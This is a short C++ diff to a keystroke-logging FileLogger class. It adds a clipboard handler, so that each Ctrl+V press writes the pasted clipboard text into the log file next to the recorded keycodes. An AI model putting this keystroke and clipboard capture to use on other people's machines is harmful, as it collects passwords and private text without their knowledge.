@@ -27,8 +27,17 @@ void writeHeader(std::ofstream &stream) {
         << std::endl << std::endl;
 }
 
+bool FileLogger::open(std::string filename) {
+    return open(nullptr, filename);
+}
+
 bool FileLogger::open(IKeycodeMapper* mapper, std::string filename) {
+    return open(mapper, nullptr, filename);
+}
+
+bool FileLogger::open(IKeycodeMapper* mapper, IClipboardHandler* clipboardHandler, std::string filename) {
     _mapper = mapper;
+    _clipboard = clipboardHandler;
 
     std::ifstream file;
     bool exists = false;
@@ -79,6 +88,17 @@ void FileLogger::logKeycode(int keycode, KeyState state) {
     } else {
         _stream << keycode << ":" << (state == KeyState::Pressed ? 1 : 0) << " ";
     }
+
+    if (_clipboard) {
+        if (state == KeyState::Pressed) {
+            if (_modifierCtrl && keycode == 'V') {
+                _stream << std::endl
+                    << "[PASTE: " << _clipboard->getClipboardString() << " ]"
+                    << std::endl;
+            }
+        }
+    }
+
     _stream.flush();
 }
 
